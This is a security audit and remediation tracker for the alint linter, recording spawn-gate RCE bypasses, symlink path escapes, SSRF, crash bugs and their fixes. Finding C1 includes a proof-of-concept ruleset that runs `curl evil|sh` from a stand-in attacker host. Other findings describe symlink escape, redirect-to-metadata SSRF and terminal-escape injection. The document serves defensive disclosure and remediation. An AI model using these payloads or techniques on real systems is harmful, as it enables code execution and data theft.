# Post-v0.13 security + correctness audit — findings & remediation

Status: **In progress (opened 2026-06-27).** Remediation lands phase-by-
phase on CHANGELOG `[Unreleased]` toward v0.14. This doc is the living
checklist: each finding's **Status** flips as it lands.

Scope of the audit: every alint crate (~69k LoC), the DSL/`extends:`
trust boundary, all rule kinds + fixers, all 8 output formats, the CLI +
e2e suite, baseline mode, CI/release infra, bundled rulesets, every
design doc/ADR/spec, the dogfood config, and the full alint.org Astro
site + marketing. Method: 12 scoped adversarial sub-audits run in
parallel, then manual source re-verification of every CRITICAL/HIGH.

## How to read this doc

Status legend per finding:

- `[ ]` — not started
- `[~]` — in progress
- `[x]` — landed (code + test + CHANGELOG)
- `[-]` — deferred or won't-fix, with rationale recorded inline

Each finding carries: **Where** (file:line ground truth), **Problem**,
**Fix** (the chosen remediation), **Test** (the regression guard), and
**Status**. Severity is the audit's calibrated severity, not the
sub-scope-local one.

## Verdict

The engineering is strong: determinism, SRI-mandatory remote extends,
billion-laughs caps, distroless/nonroot images, LF-pinned generated
contracts, and the baseline count-accounting all hold up under
adversarial reading (see §"What's verified solid"). But the central
security guarantee — the spawn gate — has **two confirmed RCE bypasses**,
and path confinement is **lexical-only** so an in-repo symlink escapes
the root and the `allow_out_of_root` gate. Those lead the remediation.

A cross-cutting root cause (§"Themes"): the spawn gate enumerates
spawning kinds at a single *pre-expansion* choke point (`reject_command_
rules_in` over raw `parent.rules`). Every bypass found — templates,
nested configs, and the historical `gff` gap — slips around that choke
point. The keystone fix re-runs the gate on the **finalized,
template-expanded** rule set, tagged by provenance, which closes all
three classes at once.

**Remediation status (updated 2026-07-03).** Everything above **landed**: all
CRITICAL (C1–C2) and HIGH (H1–H5) findings plus the full M1–M14 cluster. The
only open items are the tracked deferrals — M4 escaping-symlink *detection*, M6
tracked/changed-path collapse, M3-F2 (TOCTOU) + M3-F7, D11, L2, W6, and H6 —
each with rationale inline. The findings below read as the audit originally
recorded them (present-tense "is a bypass" = as-found, not as-shipped); the
per-finding `[x]`/`[~]`/`[-]` markers and the phase plan are the live status.
Follow-on work surfaced *after* this audit (the post-v0.13 e2e sweep and the
adversarial review of the remediation, PRs #111–#116) is tracked in the
CHANGELOG `[Unreleased]`, not here.

---

## Phase plan

| Phase | Theme | Findings | Status |
|---|---|---|---|
| 1 | CRITICAL — spawn-gate RCE | C1, C2 | `[x]` |
| 2 | HIGH — security | H1, H2, H5 | `[x]` |
| 3 | HIGH — correctness | H3, H4 | `[x]` |
| 4 | MEDIUM — security cluster | M1–M8 | `[~]` (M1/M2/M3/M5/M7/M8 done; M4 partial — dir symlinks done, escaping deferred; M6 partial — commit-lint bypass closed, tracked/changed-path collapse deferred) |
| 5 | MEDIUM — output / CLI / baseline | M9–M14 | `[x]` (M9–M14 all done) |
| 6 | Docs + LOW cleanup + dogfooding (alint) | D1–D12, L1–L14 | `[~]` (D1–D10,D12 + L1,L3–L14 + Dog1/Dog2 done; L2 partial; D11 deferred) |
| 7 | alint.org drift | W1–W7 | `[x]` (W1–W5,W7 done on the site branch; W6 partial) |

Phases land security-first. Each is one atomic commit (or a small group)
with a forward `Next: Phase N` pointer, per the phased-rollout
convention. v0.14 cuts when Phases 1–3 are green and 4–7 are fixed or
explicitly deferred.

---

## Phase 1 — CRITICAL: spawn-gate RCE bypasses

### C1 — `extends:`'d ruleset gets RCE via `templates:` `[x]`

**Severity:** Critical. **Where:** `crates/alint-dsl/src/lib.rs:465`
(`reject_command_rules_in` inspects only `rules[].kind`),
`loader.rs:104` (call site, over raw `parent.rules`), `lib.rs:661-679`
(`merge` carries an extended ruleset's `templates` in), `lib.rs:235`
(`finalize` → `expand_template` clones the template body, `kind:
command` included, *after* gating), `lib.rs:731` (`validate` only checks
version + dup ids).

**Problem:** A template-instance rule carries `extends_template:` and no
`kind`, so it passes the gate; `parent.templates` is never gated by
anything. A fully self-contained malicious ruleset achieves arbitrary
code execution through the exact vector the gate exists to stop. SRI
pins the *bytes* but never inspects them, so the advertised *secure*
distribution path gives zero protection. PoC ruleset body:

```yaml
version: 1
templates:
  - id: t
    kind: command
    command: ["sh", "-c", "curl evil|sh"]
    paths: "**/*"
    level: error
rules:
  - id: pwned
    extends_template: t
```

User only needs `extends: ["https://evil.example/r.yml#sha256-<hash>"]`.

**Fix:** See the shared keystone fix below (C1+C2). Specifically, the
post-finalize provenance-aware gate catches the expanded `kind: command`
rule whose provenance is an extended source. Also gate `parent.templates`
kinds directly at load time as defense-in-depth.

**Test:** `crates/alint-dsl` — a remote/bundled ruleset whose body is the
PoC above is rejected with the spawn-gate error; the same template used
from the **top-level** config still works.

### C2 — nested `subdir/.alint.yml` gets RCE `[x]`

**Severity:** Critical (precondition: `nested_configs: true`, opt-in, +
attacker can write a subtree config — untrusted monorepo PR, vendored
dir, submodule). **Where:** `crates/alint-dsl/src/nested.rs:125`
(`load_nested_config`).

**Problem:** `load_nested_config` rejects `extends`, `facts`, `vars`,
`ignore`, `nested_configs`, `baseline` and `allow_out_of_root` — each
called a "trusted, root-only input" — but **never calls
`reject_command_rules_in`**. Discovered nested rules are appended raw
(`lib.rs:121`) and run. The asymmetry is the tell: the *lower*-impact
keys are gated with dedicated tests while the *highest*-impact capability
(RCE) is silently accepted.

**Fix (shared keystone for C1+C2):** Thread rule **provenance**
(top-level vs extended vs nested) through `finalize`, then run
`reject_command_rules_in` + `reject_custom_facts_in` over the
**finalized, template-expanded** rule set, allowing spawning kinds only
from top-level provenance. This closes templates (C1), nested (C2) and
the historical `gff` shape in one place. Belt-and-suspenders: also call
`reject_command_rules_in(&config.rules, …)` directly in
`load_nested_config`, and gate `templates[].kind` in the extends path.

**Test:** nested `command` rule under `nested_configs: true` is rejected
(mirrors `nested_baseline_is_rejected`); a top-level `command` rule with
`nested_configs: true` still runs.

---

## Phase 2 — HIGH: security

### H1 — path confinement is lexical-only; in-repo symlinks escape root `[x]`

**Severity:** High. **Where:** `crates/alint-rules/src/pathsafe.rs:24`
(`normalize_confined`, pure-lexical, doc comment line 2 claims "a rule
can never read or resolve a file outside the tree"); direct-read
consumers that bypass the walker: `pair_hash.rs:127,147`,
`json_schema_passes.rs:107`, `file_exists.rs:135`.
`docs/design/formal-methods.md:20` markets the Kani proof as filesystem
confinement.

**Problem:** Lexical confinement is symlink-blind. If `link` is an
in-repo symlink to `/`, then `link/secret` is all-`Normal` components →
passes → `root.join(...)` → a real symlink-following read outside the
root, never consulting `allow_out_of_root`. `json_schema_passes` echoes
schema-compile errors into the violation message → content-disclosure
oracle on out-of-root files in untrusted-PR CI. Defeats ADR-0004 and the
top-level-only `allow_out_of_root` gate with no race.

**Fix:** After `root.join(confined)`, in the config-derived direct-read
sites, resolve symlinks and re-check containment against the canonical
root (subject to `allow_out_of_root`); on escape, treat as out-of-root
(fail loudly, not a silent read). Keep the lexical pass as the cheap
first gate. Correct the `pathsafe.rs` doc comment and
`formal-methods.md` to scope the Kani proof to the *lexical* policy
(symlinks explicitly out of model) — the proof is real, the prose
overclaims.

**Test:** an in-repo symlink to `/etc` + a `json_schema_passes` /
`pair_hash` / `file_exists` rule referencing through it is reported as
out-of-root (or honored only under `allow_out_of_root`), not silently
read.

### H2 — process crash on crafted multibyte value (structured-query) `[x]`

**Severity:** High. **Where:**
`crates/alint-rules/src/structured_path.rs:512` (`short_render`:
`&raw[..80]`).

**Problem:** `raw = value.to_string()` is the UTF-8 rendering of an
untrusted matched value (serde_json doesn't escape non-ASCII). A value
whose byte 80 is mid-codepoint panics `byte index 80 is not a char
boundary`. Reachable from all 8 `*_path_*` kinds on any failing
comparison; no `catch_unwind` → kills the whole rayon-parallel `alint
check` and the LSP `run_for_file`.

**Fix:** truncate on a char boundary — `raw.chars().take(80).collect()`
with an ellipsis when truncated (and audit any sibling byte-slice on
untrusted strings).

**Test:** a value of 78 ASCII bytes + a 2-byte char that fails its op
renders without panic; add to `structured_path` tests.

### H5 — `when:` expression has no recursion depth guard `[x]`

**Severity:** High. **Where:** `crates/alint-core/src/when/parser.rs:137`
(parse recursion), `when/eval.rs:42-55` (left-recursive eval on
`And`/`Or`).

**Problem:** No depth bound in lex→parse→eval. Deep `(((…)))` overflows
the parser; a *flat* `a and a and …` chain overflows `eval` despite
short-circuiting. Reachable from an untrusted remote `extends:` ruleset
(fetcher caps bytes, not nesting). Stack overflow = uncatchable SIGABRT,
the strongest determinism violation.

**Fix:** a depth counter threaded through `parse_expr`/`eval`, rejecting
past a cap (~256, mirroring `MAX_XML_DEPTH`), with a loud `WhenError`.

**Test:** `when: "(".repeat(50_000)…"` and `"a and ".repeat(50_000)+"a"`
both return a parse/eval error, not a crash.

---

## Phase 3 — HIGH: correctness

### H3 — byte-level fixers corrupt binaries; in-place writes non-atomic `[x]`

**Severity:** High (data loss / corruption of user files). **Where:**
binary-unsafe raw-byte fixers: `fixers/hygiene.rs:237`
(`normalize_line_endings`), `fixers/strip.rs:95` (`strip_bom`),
`fixers/hygiene.rs:116` (`append_final_newline`),
`fixers/creators.rs:182,260` (`file_prepend`/`file_append`); non-atomic
writes: `hygiene.rs:47,213,308`, `strip.rs:102,162`,
`creators.rs:76,182` (all `std::fs::write`, truncate-then-write).

**Problem:** Neither engine dispatch nor `eval_per_file` filters
binaries — only the rule's `paths` glob gates, and `paths: "**"` is
documented. A raw-byte fixer over a `.png` corrupts it. Separately, a
mid-write failure (ENOSPC, SIGINT) leaves the original truncated/lost.

**Fix:** (a) a shared "looks binary" guard (NUL-byte / invalid-UTF-8
heuristic, matching `file_is_text`) that the byte-level fixers consult
and skip on; (b) an atomic-write helper (temp file in the same dir +
`fsync` + rename, preserving mode) used by every content-rewriting
fixer. Reconcile `FileAppendFinalNewlineFixer::apply` with `fix_edit`
(`hygiene.rs:100-131`).

**Test:** a fixer over a crafted binary fixture leaves it byte-identical
(skipped); an atomic-write unit test; idempotence `[fix, fix]` byte-equal
tree.

### H4 — `--config` "later overrides earlier" is false `[x]`

**Severity:** High (silent wrong-config; help text actively misleads).
**Where:** help text `crates/alint/src/main.rs:49`; consumers read
`cli.config.first()` at `main.rs:570,1574,1672`.

**Problem:** First-wins, later `-c` silently dropped, and position-
sensitive across the subcommand boundary. `-c base.yml -c override.yml`
silently uses `base`. No test exercises multi-`-c`.

**Fix (decision — see §Open decisions):** make multiple `-c` a **hard
error** (fail loudly, project value) and correct the help text to "Path
to a config file." — rather than inventing layered-merge semantics that
collide with `extends:`. Revisit last-wins/layering only if a concrete
use case appears.

**Test:** `-c a -c b` exits with a clear "multiple --config" error; a
single `-c` is unaffected.

### H6 — untrusted fork-PR code runs on the persistent self-hosted runner `[-]`

**Severity:** High. **Action required — a GitHub setting + workflow change,
not a code fix I can land.** **Where:** `.github/workflows/ci.yml` +
`coverage.yml` trigger on `pull_request` with every job `runs-on:
[self-hosted, linux, alint]`, and there is no in-workflow
`head.repo.fork == false` guard. A fork PR that edits `ci/scripts/*.sh`
would run arbitrary code on the maintainer's persistent box (SSH keys,
`gh`/cargo creds, cache/bench poisoning) — GitHub's documented
"self-hosted + public repo" hazard.

**Fix (maintainer):** (1) In the repo, set *Settings → Actions → Fork pull
request workflows from outside collaborators* to **Require approval for all
outside collaborators** (the public-repo default — first-time contributors
only — is insufficient). (2) Ideally move the PR lanes to ephemeral /
GitHub-hosted runners, reserving the self-hosted box for `push`/tag/bench.
**Status:** the approval setting was applied by the maintainer (2026-06-28),
closing the immediate hole. The durable defence-in-depth fix — routing
fork-PR CI to ephemeral runners — is specced in
[`ci-fork-pr-isolation.md`](./ci-fork-pr-isolation.md) (proposed; no
workflow change has landed yet).

---

## Phase 4 — MEDIUM: security cluster

### M1 — SSRF via redirects to internal addresses `[x]`
**Where:** `extends/fetcher.rs:33`. ureq defaults `https_only:false`,
`max_redirects:10`; loader validates only the initial URL
(`loader.rs:86`). A pinned-but-malicious https host can 302 →
`http://169.254.169.254/…` / internal IPs. SRI gates the body → blind
SSRF. **Done:** set `max_redirects(0)` on the agent. The loader already
rejects a plain-`http://` initial URL, so refusing *all* redirects closes
the redirect-to-internal vector — and doesn't break the http mock tests
the way `https_only(true)` would. An `extends:` URL is SRI-pinned to
specific content, so it must be the final resource; a redirect now
surfaces as a clear status error.

### M2 — `extends:` target paths are unconfined `[x]`
**Where:** `loader.rs` (`resolve_relative` / `load_recursive`). `extends:
[/etc/hostname]` or `../../x` was read and YAML-parse errors echo content
→ exfil. **Decision (user):** *Confine + `allow_out_of_root`.*
**Done:** `load_recursive` now threads a confinement root — the top-level
config's directory — and a new `confine_extends_target` rejects any local
`extends:` target that resolves outside it. Both sides are `canonicalize`d,
so `..`, `.`, and symlinks are resolved (a symlink inside the tree pointing
out is caught too); a missing target defers to the existing not-found error
rather than being mislabelled an escape. The boundary is the config's *dir*
(not the lint root), so a `-c` pointing at an external bundle still works
while a sub-config in the chain can't escape that bundle. The top-level
`allow_out_of_root: true` (the blanket `All` form only — a `Selective`
allowlist names rule kinds/ids and has no meaning for an extends *path*)
lifts it for the whole chain; sub-configs still can't set the flag
(`reject_allow_out_of_root_in`). Nested configs reject `extends:` outright,
so no confinement is needed there. Tests: 4 unit (`confine_*`) + 2
integration (`local_extends_outside_lint_root_is_rejected`,
`local_extends_out_of_root_allowed_with_top_level_flag`).

### M3 — per-file reads bypass the 256 MiB OOM guard `[x]`
**Where:** `structured_path.rs:365,376`, `core/engine.rs:499`,
`core/rule.rs:490` (raw `std::fs::read`). The per-file family
(`file_hash`, `import_gate`, all `*_path_*`) could be OOM'd by one in-tree
multi-GB file; only cross-file kinds called `read_capped`. **Done:** the
256 MiB `MAX_ANALYZE_BYTES` cap is hoisted to `alint-core` (walker.rs) —
one source of truth, `alint-rules`'s `io.rs` re-exports it. New
`walker::read_capped_or_skip(path, size)` skips (loudly, at `warn`) a file
whose *index* size exceeds the cap **before** reading — no extra `stat`,
since the walk already recorded `FileEntry::size`. The two `alint-core`
per-file loops (`engine.rs`, `rule.rs`) call it with `entry.size`; the two
`structured_path.rs` reads (which lack an entry at one site) route through
the existing stat-based `io::read_capped`. All four sites now bounded.
Tests: `read_capped_or_skip_gates_on_the_passed_size` (proves the gate
uses the passed size, so no multi-GB fixture is needed) + missing-file.
Consistent with the L7 resilient-skip contract (one bad file never aborts
the run).

### M4 — `no_symlinks` misses directory + escaping symlinks `[~]`
**Where:** `no_symlinks.rs:29` (iterated `index.files()`, which excludes
dir entries; the walker prunes escaping symlinks pre-index). **Done (dir
symlinks):** the rule now iterates *all* index entries (`index.entries`,
not just `files()`) and re-stats each with `symlink_metadata`. An in-tree
symlink-to-directory is indexed as a dir entry (the walk follows it), so
it was silently missed before; it is now flagged. A regular directory is
never flagged (the re-stat decides). Verified with a **real-walk** test
(`evaluate_fires_on_directory_symlink_via_real_walk`) — not a hand-built
index — that both indexes and flags the dir symlink; the dogfood's
`no-tracked-symlinks` stays green. **Deferred (escaping symlinks):** a
symlink whose target escapes the repo root is *pruned by the walker
before indexing* (`filter_entry`, the path-confinement guard), so it never
reaches the rule. Recording it — without re-enabling the out-of-tree read
that H1/ADR-0004 close — needs a "yielded but non-readable" entry concept
(detect in the visitor, `WalkState::Skip` to prevent descent, an
`is_symlink` flag the per-file read path honors). That's a
security-sensitive walk/read-path change that genuinely wants its own
reviewed pass; rushing it risks reintroducing the confinement threat.
Tracked. **The user-facing gap is now closed** (review follow-up, #116):
`docs/rules.md`'s `no_symlinks` section documents that an escaping symlink is
pruned pre-index and not flagged, so a reader adopting the rule as a guardrail
isn't misled while the *detection* stays deferred.

### M5 — `git_no_denied_paths` denylist root-anchors bare literals `[x]`
**Where:** `git_no_denied_paths.rs`. For a *secrets* control, a bare *literal*
like `id_rsa` matched only the repo root, so a tracked `secrets/id_rsa` evaded.
(Correction from the adversarial review of the fix: a bare *wildcard* like
`*.pem` already crosses `/` under globset's default `literal_separator = false`,
so it was never the gap — only bare literals are root-anchored. The original
"`*.pem` matched only root" write-up over-generalised.)
**Done (maintainer chose auto-anchor):** a bare denied pattern (no `/`) is
rewritten to `**/<pattern>` so it bans a match at any depth — a no-op for
wildcards, the real fix for literals; explicit-path patterns (`secrets/*.key`,
`**/*.pem`) are taken as written; the violation message keeps the original
spelling. Tested: `anchor_denied_pattern` unit +
`bare_wildcard_crosses_slashes_bare_literal_does_not` (documents the real
globset semantics) + the `git_no_denied_paths_fires_on_nested_secret` scenario,
which uses `id_rsa` so reverting the anchoring turns it red.

### M6 — non-UTF-8 git data silently collapses checks `[~]`
**Where:** `core/git.rs:60,135` (one non-UTF-8 path → whole tracked/
changed set bails to `None`), `git.rs:431` (non-UTF-8 commit field drops
the commit from range checks → commit-message-lint bypass). **Fix:**
keep paths as `OsStr`/bytes and drop only the offending entry; for commit
fields, `from_utf8_lossy` (fail-closed/visible) rather than silently
skip the whole commit. **Done:** the commit-lint **bypass** (`git.rs:431`)
— the security-relevant half — now lossily decodes each commit field, so
a non-UTF-8 author/message can no longer dodge linting (regression test
updated). **Deferred:** the tracked/changed-path collapse (`git.rs:60,135`)
is a `HashSet<String>` → would need an `OsStr`/bytes refactor of the path
sets; lower impact (makes `git_tracked_only` over-permissive, not a
bypass). Tracked.

### M7 — `SystemTime` overflow panic on crafted commit timestamp `[x]`
**Where:** `core/git.rs:582` (`UNIX_EPOCH + Duration::from_secs(secs)`).
A 19-digit author-time panics. Reachable via `git_blame_age` on an
untrusted repo. **Done:** `UNIX_EPOCH.checked_add(...)`; on overflow the
block is dropped (matching the adjacent posture), no panic.

### M8 — terminal-escape injection in the human formatter `[x]`
**Severity:** Medium. **Where:** `output/human.rs` (unsanitized
paths/messages). A repo file named with `\x1b[…]` can hide findings or
forge an "all passed" banner when a human lints an untrusted repo.
**Done:** new `output/sanitize.rs` with `sanitize_terminal(&str) -> Cow`
— replaces every control char (C0, DEL, C1) *except* the intentional `\n`
(which `wrap_message` honors as a paragraph break) with a visible, inert
`\xNN` escape; borrows unchanged on clean input so the common path
allocates nothing. Applied to all attacker-controlled spans on the three
render paths: the grouped section-header path label, the wrapped violation
message (sanitized before `wrap_message`, so the embedded `kind: command`
subprocess output is neutralized too), the compact `<path>` + `<message>`,
and the fix `content` (sanitized whole — alint's styling is applied as
separate tokens, never inside `content`). Runs unconditionally (not
TTY-gated), so output is byte-identical to a terminal or a pipe — which
also keeps the trycmd snapshots stable (verified: no drift). alint's own
SGR is untouched. Tests: 5 unit (`sanitize::tests`) + 3 end-to-end
(`*_format_neutralizes_terminal_escapes`, asserting a raw `\x1b[2J`
clear-screen never survives while its `\x1b[2J` text form does).

---

## Phase 5 — MEDIUM: output / CLI / baseline

### M9 — SARIF `artifactLocation.uri` is a raw OS path `[x]`
**Where:** `output/sarif.rs:122`. Not percent-encoded/forward-slashed →
non-conformant for spaces/`#`/`%`; `\`-separated on Windows breaks
GitHub Code-Scanning file mapping. **Done:** a `path_to_uri` helper
slashes `\`→`/` and percent-encodes space/`#`/`%`/controls/non-ASCII per
RFC 3986; plain-ASCII paths are unchanged (existing snapshots stable);
unit-tested.

### M10 — GitLab fingerprint omits line; ADR-0006 overclaims unification `[x]`
**Where:** `output/gitlab.rs` (`SHA256(rule_id|path|message)`, excludes
line). Distinct findings with identical rule+path+message collapse to one
fingerprint — and the Code Climate spec requires *per-report uniqueness*,
so GitLab silently drops the duplicates (a generic-message per-line rule
firing on several lines of one file loses all but one). **Done (code):**
added a per-report `occurrence` discriminator (0-based index among
findings sharing `rule|path|message`) folded into the hash. This was
chosen over including the *line* deliberately: the existing
`fingerprint_independent_of_line_number` test encodes a real design goal
(a finding that drifts up/down stays the same issue across runs), and the
discriminator preserves it (single-occurrence findings keep a
line-independent fingerprint) while still disambiguating true duplicates.
New test `distinct_findings_same_message_get_distinct_fingerprints`; the
two existing stability tests still pass. **Done (docs):** ADR-0006 §74
claimed the gitlab fingerprint was migrated onto `violation_fingerprint`
— it wasn't. Corrected to say SARIF integration shipped but the gitlab
unification is **deferred** (report-fingerprint plumbing, `baseline.md`
§5/§7), matching what `baseline.md` already states. The full unification
remains the tracked follow-up.

### M11 — exit codes: documented `3` never produced; `2` overloaded `[x]`
**Decision (maintainer):** *implement exit 3.* **Where:** README:212
documents `3` (internal); `main.rs:380` funnelled every error to exit `2`,
so `3` was never produced. **Done:** added an explicit
`alint_core::Error::Internal` variant (+ `internal()` / `is_internal()`)
— distinct from the `Other`/config errors it can't be type-inferred from —
and tagged the genuinely-internal sites (the two "bug in alint"
bundled-ruleset failures in `loader.rs`, where a ruleset shipped *inside*
the binary fails to parse or declares its own `extends:`). `main()` now
searches the error chain (so a `.context(...)`-wrapped internal error is
still caught) and returns exit `3` for an internal error, `2` for a
fixable config / usage error. The README's `2 config / 3 internal`
contract is now accurate (was aspirational). Tests: `is_internal`
(core) + `error_is_internal_classifies_the_exit_code` (CLI, incl. the
context-wrapped chain). Genuine internal errors are rare (bundled rulesets
are tested), so `3` seldom fires — but the contract is now honestly wired
rather than documented-but-dead.

### M12 — `--baseline` family silently ignored on non-`check` subcommands `[x]`
**Where:** only `cmd_check` reads `cli.baseline` (`main.rs:787`); `fix`/
`list`/`baseline`/… accept the flag and ignore it, violating its
"missing baseline is an error" contract. **Done:** `--baseline` /
`--strict-baseline` / `--show-baselined` are rejected on every subcommand
except `check` (the `baseline` subcommand writes via its own `--output`,
not this flag), mirroring the `--only` rejection; trycmd-tested.

### M13 — global `--format` bypasses per-subcommand value gate by position `[x]`
**Where:** `alint --format sarif validate-config` → exit 0, silently
emitting *human* output. **Done:** the earlier attempt failed because it
used a *blanket* "reject a non-default global format" gate that fired on
subcommands with their own `--format` default (broke
`export-agents-md-markdown` / `suggest-rust-yaml`). The correct fix — the
one `list` / `facts` / `explain` already use — is per-handler: validate
the *effective* format (clap merges the global into the subcommand's
value, so it's caught regardless of position) against **that** handler's
allowed set and bail on an unsupported value. Only `validate-config`
lacked this gate; it now rejects any format other than `human` / `json`
(exit 2). Audited the rest: `check` renders all formats;
`export-agents-md` / `suggest` parse into their **own** `OutputFormat`
enum (which already rejects `sarif`); `fix` has a *documented* human
fallback (agent → human is intentional). So the surface *unification* the
prior note proposed turned out unnecessary — per-handler validation is the
right shape. trycmd `validate-config-format-rejected`; verified both the
global-position and subcommand-position invocations exit 2. (The M11 + M13
additions pushed `main.rs` over the 2000-line self-lint threshold, so its
test module was moved to `src/tests.rs` — Dog2-style — keeping the dogfood
green.)

### M14 — baseline first-offender masking under-disclosed `[x]`
**Decision (user):** *Doc + path-key the two kinds.*
**Where:** first-offender/first-match kinds (`no_trailing_whitespace`,
`line_endings`, `line_max_width`, `file_content_forbidden`) emit only the
first offender per file. The first two were already path-keyed; the latter
two fell to the default *line-content* discriminator — inconsistent, and
churny (editing the offending line re-fires). **Done (code):**
`line_max_width` + `file_content_forbidden` now set
`.with_baseline_key(crate::slash(path))`, mirroring the other two, so all
four share a `(rule, file)` identity. Compatible with the dynamic
`coverage_audit_baseline_safety` invariant (non-empty key, no collision,
not message-reliant) — audit still green. **Done (docs):** reconciled the
self-contradiction in `baseline.md` §2.4 (it listed `line_max_width` as
both a path-keyed first-offender candidate *and* a content-keyed
"default covers it" rule) — moved both kinds to the first-offender bucket;
§3.2 now scopes "narrowest possible window" to content-keyed rules; §4
gains an explicit **file-level acceptance window** disclosure for the
path-keyed first-offender rules (honest about the wider-than-content
window + why it's the right trade vs. churn). Test:
`line_max_width_first_offender_keyed_on_file_no_content_churn` proves the
edit-the-offending-line case no longer re-fires.

---

## Phase 6 — Docs, LOW cleanup, dogfooding (alint repo)

Doc drift (D):

- `[x]` **D1** README:222 "Twenty-two rulesets" enumerates only 19 —
  missing `apache/governance`, `agent-hygiene`, `agent-context`. README:44
  bullet enumerates 21. Add the three; reconcile both lists to 22.
- `[x]` **D2** `CONTRIBUTING.md:55` MSRV "Rust 1.95+" vs `Cargo.toml`
  `rust-version = "1.85"`. Fix to 1.85.
- `[x]` **D3** `SECURITY.md:43` published-crate list wrong both ways
  (lists `alint-testkit` `publish=false`; omits `alint-lsp`). Sync to
  `ci/scripts/publish-crates.sh`.
- `[x]` **D4** `GOVERNANCE.md:9` stale "Version: v0.9.x" + bogus
  four-component versioning. Update to current + semver.
- `[x]` **D5** `docs/benchmarks/README.md:8` "Latest published v0.9.6";
  METHODOLOGY/RUNNING claim a per-push `bench-compare` gate no workflow
  runs; "8 scenarios" is 14. Refresh.
- `[x]` **D6** `docs/design/deterministic-perf-gating.md:65-85`
  §Automation overstates the gate (contradicts its own §Findings:
  advisory `::warning exit 0`, self-hosted, no committed-baseline dir).
- `[x]` **D7** `docs/design/baseline.md:11` stale "Draft… post-v0.14"
  footer vs "Status: Implemented." Remove the draft footer.
- `[x]` **D8** README:39,44 "ecosystem-gated → silent no-op"
  overgeneralizes (5 rulesets are ungated; README:242 says so). Qualify.
- `[x]` **D9** `docs/rules.md:858` Action pin `@v0.9.21`; README:146
  docker `:0.10`; README:274 format list omits `agent`; README:46 lists
  3 of 6 fact predicates. Bump/complete.
- `[x]` **D10** ARCHITECTURE.md / architecture-diagrams.md /
  architecture-as-code.md describe the pre-LikeC4 Mermaid crate-graph and
  "pending merge/deploy" / "runner rebuild" state that already shipped
  (#69-71, #90). Refresh + add superseded pointers.
- `[-]` **D11** CHANGELOG: missing v0.4.3–v0.4.8 entries; em-dash vs
  hyphen header separator drift. **Deferred:** a historical CHANGELOG
  backfill, low value, and kept off-limits during the doc pass so the
  `[Unreleased]` audit entries weren't disturbed. Tracked.
- `[x]` **D12** `CONTRIBUTING.md:72` `docs.sh` gate list under-counts;
  `:189` "release.yml-equivalent CI" misnomer (PR gate is ci.yml).

LOW correctness cleanup (L):

- `[x]` **L1** `no_bidi_controls` now also flags U+061C/200E/200F (the
  implicit directional marks — completes the Trojan-Source set, matching
  rustc); `no_zero_width_chars` now also flags U+2060/U+180E. Both predicates
  back the strip fixers, so detection + fix extend together. ZWJ-in-grapheme:
  kept flagged (suspicious in source) with an honest doc note that the strip
  fixer breaks legit emoji ZWJ sequences (scope away from such files);
  grapheme-aware refinement noted as a future, not done (out of contained
  scope). Tests added for all five new codepoints.
- `[~]` **L2** `no_case_conflicts` now folds with Unicode `to_lowercase`
  (not ASCII-only), so `É`/`é` and `Ω`/`ω` collisions are caught — the strict,
  portable default for a case-conflict detector (test added). **Deferred
  (rest):** `case.rs`/`filename_case.rs` are *documented* as ASCII-scoped by
  design (camel/pascal/snake are defined on ASCII letters), so Unicode-izing
  them is a semantics change, not a bug fix; the `file_ops.rs` same-inode
  rename special-case is filesystem-semantics needing cross-platform care.
  Both want a deliberate pass.
- `[x]` **L3** the `when:` lexer now decodes the full UTF-8 scalar instead of
  casting one byte to `char` (Latin-1 mojibake), so a non-ASCII literal like
  `== "café"` matches. Escapes still work; tests cover accents, Cyrillic, emoji.
- `[x]` **L4** `FilePrependFixer`/`FileAppendFixer` (backing
  `file_header`/`file_footer`) gained an idempotency guard: if the file
  already begins/ends with exactly the content, the fixer skips instead of
  stacking a duplicate on every `--fix` (the failure mode when the configured
  content doesn't satisfy the rule's pattern, so the violation never clears).
  Both the on-disk `apply` and the editor `fix_edit` paths. Tests added.
- `[x]` **L5** Cache temp file is now PID+counter-unique (`extends/cache.rs`,
  + cleanup-on-failed-rename), so concurrent runs caching the same SRI don't
  race a fixed `<sri>.yml.tmp`. The local-extends recursion is depth-capped
  (`MAX_EXTENDS_DEPTH = 64`, checked via `visiting.len()`) so a hostile deep
  acyclic chain errors instead of overflowing the stack. Tests added.
- `[x]` **L6** `run_custom` now spawns + drains on a thread + waits on a
  30s deadline (matching the `command` rule's default), killing the child and
  resolving to the empty string on timeout — making the doc's long-standing
  timeout claim true instead of weakening it. Output is also capped (1 MiB).
  Tests (injectable timeout) cover both the timeout and the capture paths.
- `[x]` **L7** a shared `walker::read_or_skip` now skips a genuinely-absent
  file silently (the benign deleted-mid-walk race) but logs any *other* read
  error (permission/I-O) at `warn`, so it's observable with `-v`/`RUST_LOG`
  instead of silently mistaken for "file absent". Used at all three sites
  (`engine.rs`, `rule.rs`, `facts.rs`). The run stays resilient (no abort on
  one bad file — the long-standing per-file-read contract), only louder.
- `[x]` **L8** `render_path` now does a single left-to-right scan into a fresh
  buffer (matching known `{token}`s by prefix), so a value substituted for one
  token is never re-scanned for another — a repo file literally named
  `a{ext}.c` (stem `a{ext}`) no longer has its embedded `{ext}` wrongly
  expanded by the later `{ext}` pass. Unknown `{tokens}` still preserved. Test
  added.
- `[x]` **L9** `levenshtein_suggestion` skips any candidate whose length
  differs from the unknown field by more than `MAX_SUGGEST_DISTANCE` (2)
  *before* building the O(n*m) matrix — edit distance >= length diff, so this
  is correctness-preserving and bounds a hostile multi-KB field name (every
  real field is short -> no matrix built). Test added.
- `[x]` **L10** `matches` on a missing fact (Null LHS) is now falsy, mirroring
  how `null == "x"` is falsy (`==`/`!=` are total) — instead of a hard error.
  A non-string *value* (bool/int/list) is still a config-type error. The
  more-lenient direction, so no previously-valid config breaks. Test added.
- `[x]` **L11** the dashed-key hint now matches against a copy with quoted
  string literals masked to spaces (byte-length-preserving, escape-aware), so a
  dash *inside* a literal (`@.x == 'a.dashed-value'`) no longer triggers a
  false hint; a genuine dashed key alongside a literal still does. Tests added.
- `[x]` **L12** `spawn.rs` captures each child stream through `capture_capped`
  (64 MiB cap + drain-excess-to-sink, preserving the concurrent-drain
  no-deadlock property) so a runaway/compromised generator can't OOM the run.
  Truncation past the generous cap is silent-but-bounded; surfacing it to the
  caller (a user-facing note) needs `SpawnOutcome` plumbing — noted as a
  follow-up. (`command.rs` already capped its own drain.)
- `[x]` **L13** new `template::render_path_argv` (used by the `command` rule)
  prefixes `./` when substituting a path token turns a *non-flag* argv template
  into a leading-dash string — so a repo file named `--write` rendered from
  `{path}` can't flip `prettier --check {path}` into a destructive `--write`.
